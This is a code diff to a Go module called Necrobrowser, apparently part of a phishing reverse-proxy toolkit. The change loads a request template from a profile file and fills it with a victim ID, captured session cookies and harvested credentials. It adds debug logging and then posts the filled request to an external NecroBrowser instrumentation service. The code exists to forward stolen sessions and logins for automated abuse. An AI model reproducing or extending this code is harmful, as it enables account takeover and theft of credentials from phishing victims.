@@ -205,18 +205,28 @@ func (module *Necrobrowser) Instrument(victimID string, cookieJar []db.VictimCoo
 	}
 
 	c, err := json.MarshalIndent(necroCookies, "", "\t")
+	cookiesJSON := string(c)
+	
 	if err != nil {
 		module.Warning("Error marshalling the cookies: %s", err)
 		return
 	}
-
-	cookiesJSON := string(c)
+	
+	bytes, err := ioutil.ReadFile(module.Profile)
+	if err != nil {
+		module.Warning("Error reading profile file %s: %s", module.Profile, err)
+		module.Enabled = false
+		return
+	}
+	module.Request = string(bytes)
+	module.Debug(" Raw Request Body BEFORE: %+v", module.Request)
 	module.Request = strings.ReplaceAll(module.Request, TrackerPlaceholder, victimID)
 	module.Request = strings.ReplaceAll(module.Request, CookiePlaceholder, cookiesJSON)
 	module.Request = strings.ReplaceAll(module.Request, CredentialsPlaceholder, credentialsJSON)
-
+	module.Debug(" Raw Request Body: %+v", module.Request)
+	module.Debug(" Victim ID Sent: %+v", victimID)
 	module.Debug(" Sending to NecroBrowser cookies:\n%v", cookiesJSON)
-
+	
 	client := resty.New()
 	resp, err := client.R().
 		SetHeader("Content-Type", "application/json").
